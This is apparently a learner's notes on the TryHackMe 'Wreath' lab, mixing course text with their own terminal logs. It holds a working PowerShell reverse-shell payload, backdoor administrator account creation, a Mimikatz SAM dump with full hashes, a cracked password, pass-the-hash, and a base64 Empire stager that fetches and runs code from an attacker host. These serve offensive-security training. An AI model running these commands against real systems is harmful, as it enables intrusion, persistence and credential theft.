+Let's go for a reverse shell!
+We can use a Powershell reverse shell for this. Take the following shell command and substitute in the IP of the webserver, and the port you opened in the `.200` firewall in the previous question where it says IP and PORT:
+`powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+As this is a web exploit, we now have to URL encode the shell command. If using Burpsuite, you can do this by pasting the command in as the value for the "a" parameter, then selecting it and pressing Ctrl + U:
+![Using Burpsuite to encode the payload with Ctrl + U](https://assets.tryhackme.com/additional/wreath-network/f670383bd3e5.png)
+If you are using cURL then there are a variety of options available. cURL does provide a `--data-urlencode` switch; however, it's often easiest to just use a [website](https://www.urlencoder.org/) to encode the shell command, then copy it in with the `-d` switch:
+![Sending the payload with cURL](https://assets.tryhackme.com/additional/wreath-network/be3ea7bf0fe6.png)
+Pick a method (cURL, BurpSuite, or any others) and get a shell!
+Completed
+[**Video**](https://youtu.be/GOOYZCX6yY4)
+In the last task we got remote command execution running with the highest permissions possible on a local Windows machine, which means that we do not need to escalate privileges on this target.
+In the upcoming tasks we will be looking at the second teaching point of this network -- the command and control framework: Empire. Before we do that though, let's consolidate our position a little.
+From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).
+Specifically, we need a user account (as opposed to the service account which we're currently using), with the "Remote Desktop Users" group for RDP, or the "Remote Management Users" group for WinRM. A user in the "Administrators" group trumps the RDP group, and the original Administrator account can access either at will.
+We already have the ultimate access, so let's create such an account! Choose a unique username here (your TryHackMe username would do), and obviously pick a password which you don't use _anywhere_ else.
+First we create the account itself:
+`net user USERNAME PASSWORD /add`
+Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:
+`net localgroup Administrators USERNAME /add   net localgroup "Remote Management Users" USERNAME /add   `
+![Adding a new user](https://assets.tryhackme.com/additional/wreath-network/5b8e4ccaed23.png)
+We can now use this account to get stable access to the box!
+---
+As mentioned previously, we could use either RDP or WinRM for this.
+_**Note:** Whilst the target is set up to allow multiple sessions over RDP, for the sake of other users attacking the network in conjunction with memory limitations on the target, it would be appreciated if you stuck to the CLI based WinRM for the most part. We will use RDP briefly in the next section of this task, but otherwise please use WinRM when moving forward in the network.
+_
+Let's access the box over WinRM. For this we'll be using an awesome little tool called [evil-winrm](https://github.com/Hackplayers/evil-winrm).
+This does not come installed by default on Kali, so use the following command to install it from the Ruby Gem package manager:
+`sudo gem install evil-winrm`
+With evil-winrm installed, we can connect to the target with the syntax shown here:
+`evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP`
+![Authenticating with Evil-WinRM](https://assets.tryhackme.com/additional/wreath-network/28b967dedffa.png)
+_If you used an SSH portforward rather than sshuttle to access the Git Server, you will need to set up a second tunnel here to access port 5985. In this case you may also need to specify the target port using the -P switch (e.g. -_`i 127.0.0.1 -P 58950`_)._
+Note that evil-winrm usually gives medium integrity shells for added administrator accounts. Even if your new account has Administrator permissions, you won't actually be able to perform administrative actions with it via winrm.
+---
+Now let's look at connecting over RDP for a GUI environment.
+There are many RDP clients available for Linux. One of the most versatile is "xfreerdp" -- this is what we will be using here. If not already installed, you can install xfreerdp with the command:
+`sudo apt install freerdp2-x11`
+As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:
+`xfreerdp /v:IP /u:USERNAME /p:PASSWORD`
+For example:
+`xfreerdp /v:172.16.0.5 /u:user /p:'password123!'`
+Note that (as this is a command line tool), passwords containing special characters must be enclosed in quotes.
+When authentication has successfully taken place, a new window will open giving GUI access to the target.
+![Demonstration of logging in over RDP](https://assets.tryhackme.com/additional/wreath-network/a40854512a5e.png)
+That said, we can do a _lot_ more with xfreerdp. These switches are particularly useful:-
+- `/dynamic-resolution` -- allows us to resize the window, adjusting the resolution of the target in the process
+- `/size:WIDTHxHEIGHT` -- sets a specific size for targets that don't resize automatically with `/dynamic-resolution`
+- `+clipboard` -- enables clipboard support
+- `/drive:LOCAL_DIRECTORY,SHARE_NAME` -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called `share`, you could use: `/drive:.,share`, with the period (`.`) referring to the current directory
+When creating a shared drive, this can be accessed either from the command line as `\\tsclient\`, or through File Explorer under "This PC":
+![Showing the share created by xfreerdp when specifying /drive](https://assets.tryhackme.com/additional/wreath-network/9cd2021f9d36.png)
+Note that the name of the share will change according to what you selected in the `/drive` switch.
+A useful directory to share is the `/usr/share/windows-resources` directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:
+`xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`
+---
+With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a `cmd.exe` or `PowerShell` window _as an administrator_ (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:
+`\\tsclient\share\mimikatz\x64\mimikatz.exe`
+![Accessing mimikatz via the RDP share](https://assets.tryhackme.com/additional/wreath-network/fcb90c0d6fc5.png)
+_**Note:** if you used a different share name, you would need to substitute this in. Equally, if the command errors out, you may need to install mimikatz on Kali with_ `sudo apt install mimikatz`_._
+With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:
+`privilege::debug   token::elevate`
+![Elevating privileges in mimikatz](https://assets.tryhackme.com/additional/wreath-network/ce71a0375943.png)
+If we want we could log Mimikatz output with the `log` command. For example: `log c:\windows\temp\mimikatz.log`, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.
+We can now dump all of the SAM local password hashes using:
+`lsadump::sam`
+Near the top of the results you will see the Administrator's NTLM hash:
+![Dumping credentials with lsadump::sam](https://assets.tryhackme.com/additional/wreath-network/7e1e0a52e601.png)
+Jackpot!
+Answer the questions below
+```text
+PS C:\GitStack\gitphp> net user witty IbelieveinGod /add                      
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup Administrators witty /add   
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup "Remote Management Users" witty /add   
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net user witty
+User name                    witty
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            13/06/2023 01:27:13
+Password expires             Never
+Password changeable          13/06/2023 01:27:13
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net user 
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           donhew                   
+Guest                    Thomas                   WDAGUtilityAccount       
+witty 
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ evil-winrm -u witty -p IbelieveinGod -i 10.200.81.150
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\witty\Documents> whoami
+git-serv\witty
+*Evil-WinRM* PS C:\Users\witty\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes
+============================================================= ================ ============ ==================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
+BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
+*Evil-WinRM* 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ xfreerdp /v:10.200.81.150 /u:witty /p:IbelieveinGod +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+
+Do you trust the above certificate? (Y/T/N) Y
+
+Open cmd with administrator mode
+
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>\\tsclient\share\mimikatz\x64\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+676     {0;000003e7} 1 D 20175          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;000d1a07} 2 F 1685541     GIT-SERV\witty  S-1-5-21-3335744492-1614955177-2693036043-1003  (15g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 1749143     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : GIT-SERV
+SysKey : 0841f6354f4b96d21b99345d07b66571
+Local SID : S-1-5-21-3335744492-1614955177-2693036043
+
+SAMKey : f4a3c96f8149df966517ec3554632cf4
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 68b1608793104cca229de9f1dfb6fbae
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-1696O63F791Administrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
+      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
+      des_cbc_md5       (4096) : e3915234101c6b75
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WIN-1696O63F791Administrator
+    Credentials
+      des_cbc_md5       : e3915234101c6b75
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : e389f51da73551518c3c2096c0720233
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
+      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
+      des_cbc_md5       (4096) : b6f1bac2346d9e2c
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : b6f1bac2346d9e2c
+
+RID  : 000003e9 (1001)
+User : Thomas
+  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 03126107c740a83797806c207553cef7
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GIT-SERVThomas
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
+      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
+      des_cbc_md5       (4096) : e5add55e76751fbc
+    OldCredentials
+      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
+      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
+      des_cbc_md5       (4096) : 7f16a47cef890b3b
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GIT-SERVThomas
+    Credentials
+      des_cbc_md5       : e5add55e76751fbc
+    OldCredentials
+      des_cbc_md5       : 7f16a47cef890b3b
+
+RID  : 000003ea (1002)
+User : donhew
+  Hash NTLM: 2ecd55dbcf1b489459692f5eb5f7f508
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : db5d6014a0b92f51749228899c3ae2ed
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GIT-SERVdonhew
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 7e85e9df1993efc5cf499ce052ef1e65615edfda2786f621f96740b4789ff5f4
+      aes128_hmac       (4096) : 474e1cefeb459ad9ff9dd7976de113ce
+      des_cbc_md5       (4096) : 3d01c8cd018c62a7
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GIT-SERVdonhew
+    Credentials
+      des_cbc_md5       : 3d01c8cd018c62a7
+
+RID  : 000003eb (1003)
+User : witty
+  Hash NTLM: f446108d1984d55d4ea703ce6a8dd3f8
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : d06438a5d7fe9e521d388485ca21e060
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GIT-SERVwitty
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 9b09df68e786ce25be67b7694c0d432eb5e1b9a5f99dd25b79937fba0494f689
+      aes128_hmac       (4096) : e28538c1c845df11c3003a8b47e943d2
+      des_cbc_md5       (4096) : b68f76dcea04b662
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GIT-SERVwitty
+    Credentials
+      des_cbc_md5       : b68f76dcea04b662
+
+using crackstation NTLM pass i<3ruby
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.81.150
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+git-serv
+```
+Create an account on the target. Assign it to the `Administrators` and `Remote Management Users` groups.
+Completed
+Authenticate with WinRM -- make sure you can get a stable session on the target.
+Completed
+Authenticate with RDP, sharing a local copy of Mimikatz, then dump the password hashes for the users in the system.
+![[Pasted image 20230612193458.png]]
+What is the Administrator password hash?
+*37db630168e5f82aafa8461e05c6bbd1*
+What is the NTLM password hash for the user "Thomas"?
+*02d90eda8f6b6b06c32d5f207831101f*
+You won't be able to crack the Administratrator hash, but let's try cracking Thomas' password hash. Tools such as Hashcat or John the Ripper are versatile and good for most password cracking situations; however, the unsalted NTLM password hash we have in our possession can be cracked using a much simpler method.
+Sites such as [Crackstation](https://crackstation.net/) perform password _lookups._ In other words, they store a huge database of password/hash combinations, meaning that they can take a hash and instantly look up the already cracked password.
+Use Crackstation to break Thomas' hash!
+![Cracking Thomas' hash in CrackStation](https://assets.tryhackme.com/additional/wreath-network/ddb9216f5dd4.png)
+_**Note:** It should go without saying that you should never enter client password hashes into an online cracking tool in the real world. Crackstation is very good to quickly find the password in this context, however. Instead we would be more likely to crack the hashes locally using something like Hashcat -- or better yet, pass them over to a very powerful computer owned by our employers, designed to crack passwords quickly._
+What is Thomas' password?
+*i<3ruby*
+In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.
+For this reason you are encouraged to to use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.
+To do this we use the `-H` switch _instead of_ the `-p` switch we used before.
+For example:
+`evil-winrm -u Administrator -H ADMIN_HASH -i IP`
+![Pass the hash with Evil-WinRM](https://assets.tryhackme.com/additional/wreath-network/db2e05f41573.png)
+Completed
+### Task 22  Command and Control Introduction
+[**Video**](https://youtu.be/YV1hg4fnInA)
+_**Note:** If you are using the AttackBox then you are advised to skip to Task 32. The way that Empire is installed in the AttackBox is not representative of the recommended method -- a necessary design choice which was made to accommodate other software running on the machine. If you are comfortable working with Docker (and changing the instructions in the following tasks to accommodate accordingly) then feel free to read on. Otherwise please skip to the next section._
+---
+So, we have a stable shell. What now?
+With a foothold in a target network, we can start looking to bring what is known as a _C2 (Command and Control) Framework_ into play. C2 Frameworks are used to consolidate an attacker's position within a network and simplify post-exploitation steps (privesc, AV evasion, pivoting, looting, covert network tactics, etc), as well as providing red teams with extensive collaboration features. There are many C2 Frameworks available. The most famous (and expensive) is likely [Cobalt Strike](https://www.cobaltstrike.com/); however, there are many others, including the .NET based [Covenant](https://github.com/cobbr/Covenant), [Merlin](https://github.com/Ne0nd0g/merlin), [Shadow](https://github.com/bats3c/shad0w), [PoshC2](https://github.com/nettitude/PoshC2), and many others. An excellent resource for finding (and filtering) C2 frameworks is [The C2 Matrix](https://www.thec2matrix.com/), which provides a great list of the pros and cons of a huge number of frameworks.
+We have a system shell on a Windows host, making this an ideal time to introduce the second of our three teaching topics: the C2 Framework "Empire".
+Powershell Empire is, as the name suggests, a framework built primarily to attack Windows targets (although especially with the advent of dotnet core, more and more of the functionality may become usable in other systems). It provides a wide range of modules to take initial access to a network of devices, and turn it into something _much_ bigger. In this section we will be looking at the principles of PS Empire, as well as how to use it (and its GUI interface: Starkiller) to improve our shell and perform post-exploitation techniques on the Git Server.
+The Empire project was originally abandoned in early 2019; however, it was soon picked up by a company called [BC-Security](https://www.bc-security.org/), who have maintained and improved it ever since. As such, there are actually two public versions of Empire -- the original (now very outdated), and the current BC-Security fork. Be careful to get the right one!
+_**Note:** this material was originally written for Empire 3.x, but has been updated in response to the release of Empire 4.x which has a very different way of operating. Make sure to use Empire 4.x if following along with these materials._
+We will be looking into both Empire and its GUI extension: "Starkiller". Empire is the original CLI based framework but has now been split into a _server_ mode and a _client_ mode. Starkiller is a more recent addition to the toolbox, and can be used instead of (or as well as) the Empire client CLI program.
+Answer the questions below
+Read the introduction.
+Completed
+### Task 23  Command and Control Empire: Installation
+[**Video**](https://youtu.be/yXQoIQ8oeLo)
+Starkiller and Empire (via Docker) are both already installed on the TryHackMe AttackBox, so if you are not using your own machine then you can skip this task.
+---
+That said, if we are using our own VM then we need to install both Empire and Starkiller before we use them. Ultimately it's up to you which you use; both will be covered in the tasks. Regardless, we need to install at least Empire.
+In ages past this was a much more complicated process involving the Git repo and setup scripts. These days it's easiest to just use the apt repositories:
+`sudo apt install powershell-empire starkiller`
+With both installed, we now need to start an Empire server. This should stay running in the background whenever we want to use either the Empire Client or Starkiller:
+`sudo powershell-empire server`
+The server should now start:
+![Formatted command line output of Empire server starting](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2a7488301af1.png)
+It would be more common to have an Empire server running on a separate C2 server (usually hosted locally with cloud infrastructure linking back to receive inbound connections through). Multiple pentesters or red teamers would then be able to connect to a single central server.
+This is entirely overkill for our uses here -- instead we will just run both the server and the client application(s) on the single Kali instance.
+---
+With the server started, let's get the Empire CLI Client working. You are welcome to skip this if you would prefer to work exclusively in Starkiller.
+Starting the Empire CLI Client is as easy as:
+`powershell-empire client`
+![Demonstration of connecting with the Empire CLI Client](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ba333000239e.png)
+With the server instance hosted locally this should connect automatically by default. If the Empire server was on a different machine then you would need to either change the connection information in the `/usr/share/powershell-empire/empire/client/config.yaml` file, or connect manually from the Empire CLI Client using `connect HOSTNAME --username=USERNAME --password=PASSWORD`.
+---
+Starkiller is an Electron app which works by connecting to the REST API exposed by the Empire server
+With an Empire server running, we can start Starkiller by executing "`starkiller`" in a new terminal window:
+![Initial connection to Starkiller](https://assets.tryhackme.com/additional/wreath-network/57827141bfe4.png)
+From here we need to sign into the REST API we deployed previously. By default this runs on `https://localhost:1337`, with a username of `empireadmin` and a password of `password123`:
+![Starkiller connection with credentials (empireadmin:password123) shown](https://assets.tryhackme.com/additional/wreath-network/9a2bc8733ee0.png)
+Answer the questions below
+```text
+sudo powershell-empire server
+
+http://localhost:1337/index.html
+
+empireadmin:password123
+```
+Install and execute Empire/Starkiller
+Completed
+```text
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i wreath_idrsa root@10.200.81.200
+[root@prod-serv ~]# echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPSAicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZXAgLXYgZ3JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdDsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMC41MC44Mi43NDoxMzM1Jzt0PScvYWRtaW4vZ2V0LnBocCc7CnJlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHNlcnZlcit0KTsKcHJveHkgPSB1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcihwcm94eSk7Cm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JyxVQSksICgiQ29va2llIiwgInNlc3Npb249Z0FyOTcxZzI1ZTVKdUJGeGh3RGxsN0w0OFZ3PSIpXTsKdXJsbGliLnJlcXVlc3QuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdOwpkYXRhPWFbNDpdOwprZXk9SVYrJyElXUtKMHNUYmFDN0BXfU5NKiNrbi1RaGdfVmQpWEJEJy5lbmNvZGUoJ1VURi04Jyk7ClMsaixvdXQ9bGlzdChyYW5nZSgyNTYpKSwwLFtdOwpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2OwogICAgU1tpXSxTW2pdPVNbal0sU1tpXTsKaT1qPTA7CmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NjsKICAgIGo9KGorU1tpXSklMjU2OwogICAgU1tpXSxTW2pdPVNbal0sU1tpXTsKICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSk7CmV4ZWMoJycuam9pbihvdXQpKTs='));" | python3 &
+[1] 2034
+```
+Using the `help` command for guidance: in Empire CLI, how would we run the `whoami` command inside an agent?
+*shell whoami*
+We have now covered the basics of Empire, with the exception of modules, which we will look at after getting an agent back from the Git Server.
+Kill your agents on the webserver then let's look at proxying Empire agents!
+Completed
+### Task 28  Command and Control Empire: Hop Listeners
+[**Video**](https://youtu.be/__Aej5xeHZU)
+As mentioned previously, Empire agents can't be proxied with a socat relay or any equivalent redirects; but there must be a way to get an agent back from a target with no outbound access, right?
+The answer is yes. We use something called a Hop Listener.
+Hop Listeners create what looks like a regular listener in our list of listeners (like the http listener we used before); however, rather than opening a port to receive a connection, hop listeners create files to be copied across to the compromised "jump" server and served from there. These files contain instructions to connect back to a normal (usually HTTP) listener on our attacking machine. As such, the hop listener in the listeners menu can be thought of as more of a placeholder -- a reference to be used when generating stagers.
+If this doesn't make much sense just now, don't worry! Hopefully it will once we have worked through an example.
+The hop listener we will be working with is the most common kind: the `http_hop` listener.
+When created, this will create a set of `.php` files which must be uploaded to the jumpserver (our compromised webserver) and served by a HTTP server. Under normal circumstances this would be a trivial task as the compromised server already has a webserver running; however, out of courtesy to anyone else attempting the network, we will not be using the installed webserver.
+---
+Let's first look at starting the listener in Empire CLI.
+Switch into the context of the listener using `uselistener http_hop` from the main Empire menu (you may need to use `back` a few times to get out of any agents, etc). There are a few options we're interested in here:
+![Highlighting the options needing set for the http_hop listener: RedirectListener, Host, and Port](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/8fff79486323.png)
+Specifically we need:-
+- A **RedirectListener** -- this is a regular listener to forward any received agents to. Think of the hop listener as being something like a relay on the compromised server; we still need to catch it with something! You could use the listener you set up earlier for this, or create an entirely new HTTP listener using the same steps we used earlier. Make sure that this matches up with the name of an already active listener though!
+- A **Host** -- the IP of the compromised webserver (`.200`).
+- A **Port** -- this is the port which will be used for the webserver hosting our hop files. Pick a random port here (above 15000), but remember it!
+When filled in, our options should look something like this:
+![Showing the full options for the hop_listener when set. Also executing the listener.](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/0a85d9e55345.png)
+As shown in the screenshot, we then once again use `execute` to start the listener.
